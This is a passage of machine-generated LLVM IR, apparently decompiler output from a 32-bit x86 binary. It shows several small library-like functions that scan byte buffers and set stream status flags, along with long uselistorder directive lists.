  %v5_80574aa2850.in = phi i8 [ %v4_80574aa2743, %dec_label_pc_805740a ], [ %v4_80574aa27, %dec_label_pc_8057464 ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_805740a ], [ %stack_var_-17.135, %dec_label_pc_8057464 ]
  %v1_8057471.ph48 = phi i32 [ 0, %dec_label_pc_805740a ], [ %v0_80574a4.pre, %dec_label_pc_8057464 ]
  %v0_805741f.ph47 = phi i32 [ %arg2, %dec_label_pc_805740a ], [ %v1_80574aa.pre.pre, %dec_label_pc_8057464 ]
  br label %dec_label_pc_8057418

dec_label_pc_80574b6:                             ; preds = %dec_label_pc_8057464, %dec_label_pc_8057431, %dec_label_pc_805740a
  %v0_80574bb = phi i32 [ 0, %dec_label_pc_805740a ], [ %v4_8057442, %dec_label_pc_8057431 ], [ %v0_8057422.pre.pre, %dec_label_pc_8057464 ]
  %v8_8057418.lcssa = phi i1 [ false, %dec_label_pc_805740a ], [ true, %dec_label_pc_8057431 ], [ %v8_805741831, %dec_label_pc_8057464 ]
  %v2_80574bd = zext i1 %v8_8057418.lcssa to i32
  %v3_80574bd = add i32 %v0_80574bb, 1
  %v4_80574bd = add i32 %v3_80574bd, %v2_80574bd
  br label %dec_label_pc_80574c5

dec_label_pc_80574c2:                             ; preds = %dec_label_pc_8057454, %dec_label_pc_80573f4
  br label %dec_label_pc_80574c5

dec_label_pc_80574c5:                             ; preds = %dec_label_pc_80574b6, %dec_label_pc_80574c2
  %storemerge = phi i32 [ %v4_80574bd, %dec_label_pc_80574b6 ], [ -1, %dec_label_pc_80574c2 ]
  store i32 %v0_80573f6, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8057471.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_80574aa, { 1, 0 }
  uselistorder i32 %v2_8057450, { 0, 2, 1 }
  uselistorder i32 %v4_8057442, { 0, 2, 1 }
  uselistorder i32 %v5_80574aa36, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 1, { 1, 27, 28, 0, 29, 25, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 2, 3, 24, 26, 4 }
  uselistorder i8 46, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i16*, i32, i32)* @function_8051e5c, { 5, 6, 7, 8, 9, 10, 11, 12, 0, 1, 13, 14, 16, 17, 2, 3, 4, 15 }
  uselistorder i32* @edi, { 3, 131, 132, 19, 133, 134, 135, 18, 136, 137, 138, 2, 0, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 21, 5, 4, 26, 27, 28, 29, 30, 31, 32, 33, 34, 154, 7, 155, 8, 156, 157, 6, 158, 159, 160, 161, 166, 167, 1, 162, 163, 164, 165, 168, 169, 170, 171, 9, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 61, 10, 62, 63, 64, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 228, 35, 36, 65, 66, 111, 67, 68, 69, 70, 71, 72, 73, 74, 75, 11, 76, 77, 78, 79, 80, 81, 82, 229, 230, 231, 12, 232, 233, 236, 237, 238, 20, 239, 250, 251, 37, 38, 39, 40, 41, 42, 43, 50, 51, 52, 53, 54, 255, 265, 266, 267, 268, 269, 256, 257, 258, 259, 260, 261, 262, 263, 264, 215, 216, 217, 218, 219, 220, 221, 222, 13, 223, 224, 225, 226, 227, 270, 271, 14, 272, 273, 274, 275, 276, 277, 278, 121, 122, 123, 124, 125, 83, 84, 15, 85, 213, 214, 253, 254, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 16, 110, 44, 45, 46, 96, 17, 97, 98, 246, 247, 248, 249, 22, 23, 24, 25, 234, 235, 55, 56, 129, 130, 115, 116, 244, 245, 211, 212, 252, 240, 241, 242, 243, 47, 48, 49, 57, 58, 59, 60, 112, 113, 114, 117, 118, 119, 120, 126, 127, 128 }
  uselistorder i32 256, { 5, 6, 7, 8, 9, 10, 43, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 44, 22, 23, 24, 42, 25, 26, 27, 28, 0, 1, 29, 2, 45, 49, 30, 31, 4, 47, 48, 3, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 50, 41 }
  uselistorder i1 true, { 1, 2, 4, 5, 6, 7, 8, 9, 3, 0 }
  uselistorder i32* @esi, { 175, 176, 177, 178, 179, 180, 37, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 38, 43, 48, 11, 5, 49, 50, 53, 51, 52, 6, 54, 55, 201, 12, 202, 203, 206, 204, 205, 213, 207, 208, 209, 210, 211, 212, 214, 215, 216, 217, 218, 219, 220, 13, 7, 221, 222, 223, 224, 225, 14, 34, 226, 227, 228, 229, 230, 231, 15, 232, 233, 234, 235, 236, 237, 16, 238, 239, 240, 241, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 17, 97, 98, 242, 243, 244, 18, 19, 245, 20, 246, 247, 249, 248, 8, 250, 251, 252, 253, 254, 255, 256, 257, 0, 39, 258, 259, 9, 260, 261, 262, 263, 56, 57, 58, 280, 281, 282, 283, 21, 22, 163, 99, 100, 101, 23, 102, 103, 104, 105, 106, 107, 108, 166, 167, 284, 285, 42, 286, 287, 288, 296, 297, 298, 299, 289, 294, 295, 59, 60, 61, 62, 63, 64, 80, 81, 82, 1, 83, 84, 85, 65, 66, 67, 68, 69, 311, 321, 24, 322, 323, 316, 317, 318, 319, 320, 312, 313, 314, 315, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 25, 275, 40, 276, 277, 278, 279, 324, 327, 328, 331, 332, 333, 334, 168, 169, 170, 171, 172, 164, 10, 300, 26, 301, 302, 109, 27, 110, 41, 35, 329, 330, 165, 325, 326, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 29, 122, 2, 124, 125, 126, 127, 28, 128, 129, 123, 130, 131, 132, 133, 3, 134, 135, 136, 137, 138, 139, 140, 36, 30, 141, 142, 31, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 32, 160, 161, 162, 33, 70, 143, 4, 144, 145, 290, 291, 292, 293, 303, 304, 305, 306, 307, 308, 44, 45, 46, 47, 309, 310, 173, 174, 71, 72, 73, 74, 75, 76, 77, 78, 79, 86, 335 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_80574c5, { 1, 0 }
}

define i32 @function_80574d0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80574d0:
  %v1_80574de = icmp eq i32 %arg1, 0
  br i1 %v1_80574de, label %dec_label_pc_805750d, label %dec_label_pc_80574fe.preheader

dec_label_pc_80574fe.preheader:                   ; preds = %dec_label_pc_80574d0
  store i32 %arg2, i32* @ecx, align 4
  %v2_80574fe10 = add i32 %arg2, %arg1
  %v3_80574fe11 = inttoptr i32 %v2_80574fe10 to i8*
  %v4_80574fe12 = load i8, i8* %v3_80574fe11, align 1
  %v1_805750214 = add i32 %arg2, 1
  %v1_805750515 = icmp eq i8 %v4_80574fe12, 0
  %v1_805750716 = icmp eq i1 %v1_805750515, false
  br i1 %v1_805750716, label %dec_label_pc_80574ed, label %dec_label_pc_8057509

dec_label_pc_80574e4:                             ; preds = %dec_label_pc_80574ed
  %v1_80574e4 = add i32 %v0_80574e417, 2
  br label %dec_label_pc_8057509

dec_label_pc_80574ed:                             ; preds = %dec_label_pc_80574fe.preheader, %dec_label_pc_80574fe
  %v1_805750219 = phi i32 [ %v1_8057502, %dec_label_pc_80574fe ], [ %v1_805750214, %dec_label_pc_80574fe.preheader ]
  %v5_80574fe18.in = phi i8 [ %v4_80574fe, %dec_label_pc_80574fe ], [ %v4_80574fe12, %dec_label_pc_80574fe.preheader ]
  %v0_80574e417 = phi i32 [ %v2_80574fb, %dec_label_pc_80574fe ], [ %arg2, %dec_label_pc_80574fe.preheader ]
  %v5_80574fe18 = zext i8 %v5_80574fe18.in to i32
  %v1_80574ef = and i32 %v5_80574fe18, 192
  %v6_80574f4 = icmp eq i32 %v1_80574ef, 192
  %v2_80574fb = add i32 %v5_80574fe18, %v1_805750219
  br i1 %v6_80574f4, label %dec_label_pc_80574e4, label %dec_label_pc_80574fe

dec_label_pc_80574fe:                             ; preds = %dec_label_pc_80574ed
  store i32 %v2_80574fb, i32* @ecx, align 4
  %v2_80574fe = add i32 %v2_80574fb, %arg1
  %v3_80574fe = inttoptr i32 %v2_80574fe to i8*
  %v4_80574fe = load i8, i8* %v3_80574fe, align 1
  %v1_8057502 = add i32 %v2_80574fb, 1
  %v1_8057505 = icmp eq i8 %v4_80574fe, 0
  %v1_8057507 = icmp eq i1 %v1_8057505, false
  br i1 %v1_8057507, label %dec_label_pc_80574ed, label %dec_label_pc_8057509

dec_label_pc_8057509:                             ; preds = %dec_label_pc_80574fe.preheader, %dec_label_pc_80574fe, %dec_label_pc_80574e4
  %v0_8057509 = phi i32 [ %v1_80574e4, %dec_label_pc_80574e4 ], [ %v1_805750214, %dec_label_pc_80574fe.preheader ], [ %v1_8057502, %dec_label_pc_80574fe ]
  %v2_805750b = sub i32 %v0_8057509, %arg2
  br label %dec_label_pc_805750d

dec_label_pc_805750d:                             ; preds = %dec_label_pc_80574d0, %dec_label_pc_8057509
  %v0_8057510 = phi i32 [ -1, %dec_label_pc_80574d0 ], [ %v2_805750b, %dec_label_pc_8057509 ]
  ret i32 %v0_8057510

; uselistorder directives
  uselistorder i8 %v4_80574fe, { 1, 0 }
  uselistorder i32 %v2_80574fb, { 2, 3, 1, 0 }
  uselistorder i32 192, { 1, 3, 2, 4, 0 }
  uselistorder i32 2, { 101, 30, 102, 103, 104, 52, 106, 107, 27, 28, 29, 0, 1, 105, 108, 109, 110, 70, 111, 112, 113, 114, 115, 116, 72, 2, 73, 74, 33, 117, 118, 3, 53, 34, 4, 5, 119, 82, 83, 48, 120, 121, 122, 123, 71, 125, 126, 38, 84, 85, 49, 11, 12, 41, 42, 127, 39, 69, 54, 55, 6, 56, 7, 57, 8, 58, 59, 13, 14, 43, 15, 16, 124, 17, 18, 50, 19, 128, 129, 131, 132, 9, 44, 99, 100, 92, 93, 35, 36, 37, 20, 130, 45, 86, 87, 40, 21, 22, 88, 23, 89, 24, 46, 90, 91, 25, 94, 98, 51, 75, 76, 77, 60, 61, 78, 31, 79, 10, 80, 62, 32, 81, 63, 64, 65, 95, 47, 96, 26, 97, 66, 67, 68 }
  uselistorder i32* @ecx, { 24, 5, 7, 23, 6, 0, 101, 102, 103, 104, 12, 105, 106, 107, 108, 13, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 32, 33, 34, 35, 36, 37, 38, 39, 125, 126, 8, 9, 40, 1, 127, 128, 44, 11, 16, 129, 130, 14, 10, 15, 131, 132, 133, 134, 135, 136, 160, 161, 162, 163, 2, 41, 45, 46, 29, 47, 100, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 25, 73, 74, 75, 76, 26, 77, 22, 28, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 17, 185, 171, 172, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 18, 153, 154, 156, 157, 158, 159, 155, 170, 196, 197, 198, 199, 200, 201, 202, 137, 30, 31, 78, 79, 80, 81, 82, 83, 84, 27, 85, 86, 87, 88, 89, 90, 19, 20, 3, 4, 91, 92, 21, 93, 94, 95, 96, 97, 99, 42, 43, 98, 164, 169, 165, 168, 166, 167 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805750d, { 1, 0 }
  uselistorder label %dec_label_pc_8057509, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80574ed, { 1, 0 }
}

define i32 @function_8057514(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8057514:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057514 = load i32, i32* @ebx, align 4
  store i32 %v0_8057514, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_805751a = ptrtoint i16* %arg1 to i32
  store i32 %v4_805751a, i32* @ebx, align 4
  %v1_8057522 = bitcast i16* %arg1 to i8*
  %v2_8057522 = load i8, i8* %v1_8057522, align 1
  %v3_8057522 = and i8 %v2_8057522, 4
  %v4_8057522 = icmp eq i8 %v3_8057522, 0
  %v1_8057525 = icmp eq i1 %v4_8057522, false
  br i1 %v1_8057525, label %dec_label_pc_805755d, label %dec_label_pc_8057527

dec_label_pc_8057527:                             ; preds = %dec_label_pc_8057514
  %v2_8057527 = icmp slt i32 %arg3, 0
  %v3_805752e = select i1 %v2_8057527, i32 2147483647, i32 %arg3
  %v1_8057537 = add i32 %v4_805751a, 4
  %v2_8057537 = inttoptr i32 %v1_8057537 to i32*
  %v3_8057537 = load i32, i32* %v2_8057537, align 4
  %v3_805753a = inttoptr i32 %arg2 to i32*
  %v4_805753a = call i32 @function_8050de0(i32 %v3_8057537, i32* %v3_805753a, i32 %v3_805752e)
  store i32 %v4_805753a, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp slt i32 %v4_805753a, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_805755d, label %dec_label_pc_8057549

dec_label_pc_8057549:                             ; preds = %dec_label_pc_8057527
  %v1_8057542 = icmp eq i32 %v4_805753a, 0
  %v4_8057547 = icmp eq i1 %v1_8057542, false
  %v0_8057549 = load i32, i32* @ebx, align 4
  %v1_8057549 = inttoptr i32 %v0_8057549 to i32*
  %v2_8057549 = load i32, i32* %v1_8057549, align 4
  br i1 %v4_8057547, label %dec_label_pc_8057555, label %dec_label_pc_805754d

dec_label_pc_805754d:                             ; preds = %dec_label_pc_8057549
  %v1_805754d = or i32 %v2_8057549, 4
  %v1_8057550 = trunc i32 %v1_805754d to i16
  %v3_8057550 = inttoptr i32 %v0_8057549 to i16*
  store i16 %v1_8057550, i16* %v3_8057550, align 2
  br label %dec_label_pc_805755d

dec_label_pc_8057555:                             ; preds = %dec_label_pc_8057549
  %v1_8057555 = or i32 %v2_8057549, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_805755a = trunc i32 %v1_8057555 to i16
  %v3_805755a = inttoptr i32 %v0_8057549 to i16*
  store i16 %v1_805755a, i16* %v3_805755a, align 2
  br label %dec_label_pc_805755d

dec_label_pc_805755d:                             ; preds = %dec_label_pc_8057527, %dec_label_pc_8057514, %dec_label_pc_805754d, %dec_label_pc_8057555
  %v0_805755e = load i32, i32* %ecx.global-to-local, align 4
  %v2_8057561 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057561, i32* @ebx, align 4
  ret i32 %v0_805755e

; uselistorder directives
  uselistorder i32 %v4_805753a, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @function_8050de0, { 1, 0 }
  uselistorder i32 4, { 209, 210, 211, 212, 55, 219, 220, 221, 215, 213, 214, 216, 217, 218, 0, 6, 222, 223, 224, 225, 226, 227, 228, 229, 230, 27, 47, 73, 74, 75, 28, 29, 30, 231, 42, 1, 76, 7, 8, 153, 154, 155, 232, 233, 48, 234, 156, 157, 158, 235, 236, 237, 238, 239, 240, 241, 242, 50, 243, 244, 245, 246, 56, 31, 247, 248, 249, 250, 32, 33, 34, 57, 35, 36, 58, 37, 251, 38, 252, 59, 39, 60, 61, 9, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 49, 169, 277, 170, 278, 279, 285, 286, 288, 289, 290, 280, 43, 70, 281, 282, 283, 284, 10, 79, 80, 81, 82, 62, 130, 131, 132, 51, 146, 147, 148, 149, 83, 84, 85, 86, 87, 52, 11, 88, 89, 291, 293, 296, 305, 306, 307, 308, 309, 12, 297, 298, 299, 300, 301, 302, 303, 304, 294, 295, 253, 45, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 26, 274, 275, 46, 276, 13, 90, 292, 77, 78, 310, 311, 44, 312, 313, 314, 315, 2, 14, 3, 192, 53, 91, 54, 287, 15, 171, 16, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 40, 41, 71, 63, 189, 190, 191, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 68, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 4, 150, 17, 18, 151, 19, 64, 65, 69, 152, 66, 193, 194, 20, 5, 21, 22, 195, 23, 196, 197, 198, 199, 200, 201, 202, 203, 24, 25, 204, 205, 206, 207, 208, 67, 72 }
  uselistorder i32 2147483647, { 2, 0, 1, 3 }
  uselistorder i8 0, { 160, 35, 4, 7, 8, 36, 6, 5, 161, 162, 163, 10, 169, 164, 165, 9, 167, 168, 166, 29, 170, 1, 2, 51, 53, 54, 171, 172, 32, 174, 11, 13, 56, 55, 12, 37, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 85, 86, 185, 186, 16, 192, 188, 189, 187, 14, 190, 191, 15, 30, 193, 194, 195, 196, 197, 198, 199, 207, 208, 18, 58, 57, 17, 59, 60, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 3, 157, 103, 104, 209, 105, 211, 212, 213, 214, 200, 201, 202, 203, 204, 205, 38, 206, 139, 20, 158, 159, 19, 106, 107, 49, 27, 26, 0, 39, 40, 41, 108, 215, 142, 173, 109, 110, 111, 112, 113, 114, 115, 116, 117, 21, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 28, 131, 132, 133, 134, 135, 136, 137, 138, 61, 210, 52, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 33, 79, 80, 81, 82, 83, 84, 140, 141, 143, 144, 145, 22, 146, 147, 34, 148, 31, 149, 150, 152, 151, 23, 153, 154, 25, 155, 24, 156, 50, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i8 4, { 3, 0, 4, 2, 1 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805755d, { 3, 2, 0, 1 }
}

define i32 @function_8057564(i32 %arg1) local_unnamed_addr {
dec_label_pc_8057564:
  %edx.global-to-local = alloca i32, align 4
  %v0_8057564 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805756c = add i32 %arg1, 8
  %v2_805756c = inttoptr i32 %v1_805756c to i32*
  %v3_805756c = load i32, i32* %v2_805756c, align 4
  store i32 %v3_805756c, i32* %edx.global-to-local, align 4
  %v1_805756f = add i32 %arg1, 12
  %v2_805756f = inttoptr i32 %v1_805756f to i32*
  %v3_805756f = load i32, i32* %v2_805756f, align 4
  %v2_8057572 = sub i32 %v3_805756f, %v3_805756c
  %v3_8057577 = inttoptr i32 %arg1 to i16*
  %v4_8057577 = call i32 @function_8057514(i16* %v3_8057577, i32 %v3_805756c, i32 %v2_8057572)
  %v0_805757c = load i32, i32* @ebx, align 4
  %v1_805757c = add i32 %v0_805757c, 8
  %v2_805757c = inttoptr i32 %v1_805757c to i32*
  %v3_805757c = load i32, i32* %v2_805757c, align 4
  store i32 %v3_805757c, i32* %edx.global-to-local, align 4
  %v2_805757f = add i32 %v0_805757c, 16
  %v3_805757f = inttoptr i32 %v2_805757f to i32*
  store i32 %v3_805757c, i32* %v3_805757f, align 4
  %v0_8057582 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057582 = add i32 %v0_8057582, %v4_8057577
  store i32 %v2_8057582, i32* %edx.global-to-local, align 4
  %v1_8057584 = load i32, i32* @ebx, align 4
  %v2_8057584 = add i32 %v1_8057584, 20
  %v3_8057584 = inttoptr i32 %v2_8057584 to i32*
  store i32 %v2_8057582, i32* %v3_8057584, align 4
  store i32 %v0_8057564, i32* @ebx, align 4
  ret i32 %v4_8057577

; uselistorder directives
  uselistorder i32 %v4_8057577, { 1, 0 }
  uselistorder i32 20, { 22, 23, 24, 25, 26, 27, 28, 2, 12, 29, 4, 30, 3, 20, 21, 1, 7, 8, 10, 9, 13, 14, 15, 16, 17, 5, 18, 19, 31, 6, 11, 0 }
  uselistorder i32 16, { 69, 70, 71, 72, 73, 75, 74, 0, 76, 77, 11, 6, 78, 12, 79, 80, 81, 10, 7, 38, 39, 82, 83, 84, 85, 86, 87, 94, 88, 89, 90, 91, 92, 93, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 40, 41, 65, 66, 42, 43, 44, 45, 107, 13, 14, 21, 22, 31, 23, 112, 105, 2, 1, 106, 4, 3, 113, 114, 15, 111, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 16, 61, 62, 63, 64, 108, 109, 110, 24, 25, 26, 27, 28, 29, 30, 32, 33, 9, 34, 35, 36, 37, 5, 17, 67, 8, 18, 19, 68, 20, 115 }
  uselistorder i32 12, { 63, 64, 65, 66, 67, 0, 68, 18, 25, 1, 69, 70, 71, 22, 21, 8, 7, 9, 10, 11, 12, 13, 14, 15, 48, 49, 50, 51, 52, 53, 54, 55, 2, 19, 20, 56, 62, 57, 90, 24, 26, 41, 47, 27, 28, 100, 101, 102, 103, 104, 105, 106, 92, 93, 94, 95, 96, 97, 98, 99, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 23, 89, 107, 108, 109, 110, 91, 58, 3, 4, 59, 60, 16, 17, 61, 5, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 43, 44, 45, 46, 6, 111 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @function_805758c(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805758c:
  %stack_var_-12 = alloca i32, align 4
  %v0_805758c = load i32, i32* @ebx, align 4
  %v4_8057590 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8057590, i32* @ebx, align 4
  %v2_8057598 = load i16, i16* %arg1, align 2
  %v3_8057598 = zext i16 %v2_8057598 to i32
  %v2_805759b = and i32 %v3_8057598, %arg2
  %v3_805759b = icmp eq i32 %v2_805759b, 0
  %v1_805759d = icmp eq i1 %v3_805759b, false
  br i1 %v1_805759d, label %dec_label_pc_80575ab, label %dec_label_pc_805759f

dec_label_pc_805759f:                             ; preds = %dec_label_pc_805758c
  %v1_805759f = and i32 %v3_8057598, 2176
  %v2_805759f = icmp eq i32 %v1_805759f, 0
  %v1_80575a4 = icmp eq i1 %v2_805759f, false
  br i1 %v1_80575a4, label %dec_label_pc_80575b2, label %dec_label_pc_80575a6

dec_label_pc_80575a6:                             ; preds = %dec_label_pc_805759f
  %v2_80575a6 = or i32 %v3_8057598, %arg2
  %v1_80575a8 = trunc i32 %v2_80575a6 to i16
  store i16 %v1_80575a8, i16* %arg1, align 2
  %v0_80575ab.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80575ab

dec_label_pc_80575ab:                             ; preds = %dec_label_pc_805758c, %dec_label_pc_80575a6
  %v0_80575d1 = phi i32 [ %v4_8057590, %dec_label_pc_805758c ], [ %v0_80575ab.pre, %dec_label_pc_80575a6 ]
  %v1_80575ab = inttoptr i32 %v0_80575d1 to i16*
  %v2_80575ab = load i16, i16* %v1_80575ab, align 2
  %v2_80575ae = and i16 %v2_80575ab, 16
  %v3_80575ae = icmp eq i16 %v2_80575ae, 0
  br i1 %v3_80575ae, label %dec_label_pc_80575ca, label %dec_label_pc_80575b2

dec_label_pc_80575b2:                             ; preds = %dec_label_pc_80575ab, %dec_label_pc_805759f
  %v1_80575b2 = call i32 @function_8050f90(i32 %v0_805758c)
  %v1_80575b7 = inttoptr i32 %v1_80575b2 to i32*
  store i32 9, i32* %v1_80575b7, align 4
  br label %dec_label_pc_80575bd

dec_label_pc_80575bd:                             ; preds = %dec_label_pc_80575ce, %dec_label_pc_80575b2
  %v0_80575bd = load i32, i32* @ebx, align 4
  %v1_80575bd = inttoptr i32 %v0_80575bd to i32*
  %v2_80575bd = load i32, i32* %v1_80575bd, align 4
  %v1_80575bf = or i32 %v2_80575bd, 8
  %v1_80575c2 = trunc i32 %v1_80575bf to i16
  %v3_80575c2 = inttoptr i32 %v0_80575bd to i16*
  store i16 %v1_80575c2, i16* %v3_80575c2, align 2
  br label %dec_label_pc_80575f6

dec_label_pc_80575ca:                             ; preds = %dec_label_pc_80575ab
  %v2_80575ca = and i16 %v2_80575ab, 64
  %v3_80575ca = icmp eq i16 %v2_80575ca, 0
  br i1 %v3_80575ca, label %dec_label_pc_80575ec, label %dec_label_pc_80575ce

dec_label_pc_80575ce:                             ; preds = %dec_label_pc_80575ca
  %v2_80575d2 = call i32 @function_805116c(i32 %v0_80575d1)
  %v1_80575da = icmp eq i32 %v2_80575d2, 0
  %v1_80575dc = icmp eq i1 %v1_80575da, false
  br i1 %v1_80575dc, label %dec_label_pc_80575bd, label %dec_label_pc_80575de

dec_label_pc_80575de:                             ; preds = %dec_label_pc_80575ce
  %v0_80575de = load i32, i32* @ebx, align 4
  %v1_80575de = add i32 %v0_80575de, 8
  %v2_80575de = inttoptr i32 %v1_80575de to i32*
  %v3_80575de = load i32, i32* %v2_80575de, align 4
  %v2_80575e1 = add i32 %v0_80575de, 28
  %v3_80575e1 = inttoptr i32 %v2_80575e1 to i32*
  store i32 %v3_80575de, i32* %v3_80575e1, align 4
  %v0_80575e4 = load i32, i32* @ebx, align 4
  %v1_80575e4 = inttoptr i32 %v0_80575e4 to i32*
  %v2_80575e4 = load i32, i32* %v1_80575e4, align 4
  %v2_80575e4.tr = trunc i32 %v2_80575e4 to i16
  %v1_80575e9 = and i16 %v2_80575e4.tr, -65
  %v3_80575e9 = inttoptr i32 %v0_80575e4 to i16*
  store i16 %v1_80575e9, i16* %v3_80575e9, align 2
  %v0_80575ec.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80575ec

dec_label_pc_80575ec:                             ; preds = %dec_label_pc_80575ca, %dec_label_pc_80575de
  %v2_80575f1 = phi i32 [ %v0_80575d1, %dec_label_pc_80575ca ], [ %v0_80575ec.pre, %dec_label_pc_80575de ]
  %v1_80575ec = inttoptr i32 %v2_80575f1 to i32*
  %v2_80575ec = load i32, i32* %v1_80575ec, align 4
  %v1_80575ee = or i32 %v2_80575ec, 1
  %v1_80575f1 = trunc i32 %v1_80575ee to i16
  %v3_80575f1 = inttoptr i32 %v2_80575f1 to i16*
  store i16 %v1_80575f1, i16* %v3_80575f1, align 2
  br label %dec_label_pc_80575f6

dec_label_pc_80575f6:                             ; preds = %dec_label_pc_80575bd, %dec_label_pc_80575ec
  %storemerge = phi i32 [ 0, %dec_label_pc_80575ec ], [ -1, %dec_label_pc_80575bd ]
  %v2_80575f6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80575f6, i32* @edx, align 4
  store i32 %v0_805758c, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8057598, { 0, 2, 1 }
  uselistorder i32 %v0_805758c, { 1, 0 }
  uselistorder i32* @edx, { 351, 3, 352, 353, 354, 355, 356, 357, 358, 359, 4, 360, 361, 362, 363, 364, 365, 14, 368, 366, 367, 369, 370, 371, 372, 373, 374, 375, 16, 17, 18, 19, 20, 376, 377, 378, 379, 380, 381, 382, 389, 383, 384, 385, 386, 387, 388, 1, 15, 390, 391, 392, 393, 286, 287, 394, 395, 396, 288, 289, 290, 291, 292, 398, 403, 400, 401, 402, 404, 405, 406, 407, 440, 5, 21, 293, 294, 295, 296, 297, 298, 299, 300, 441, 442, 443, 444, 6, 445, 446, 333, 448, 449, 23, 22, 450, 451, 409, 453, 454, 459, 458, 24, 25, 26, 27, 28, 29, 31, 465, 475, 7, 476, 477, 478, 479, 480, 481, 466, 467, 468, 469, 470, 471, 472, 8, 473, 474, 463, 464, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 9, 435, 436, 437, 438, 439, 462, 30, 482, 483, 485, 334, 335, 0, 484, 301, 302, 303, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 13, 321, 322, 304, 323, 10, 324, 325, 327, 11, 328, 329, 330, 331, 332, 32, 12, 326, 452, 336, 337, 447, 461, 350, 455, 397, 460, 399, 338, 339, 408, 456, 457, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 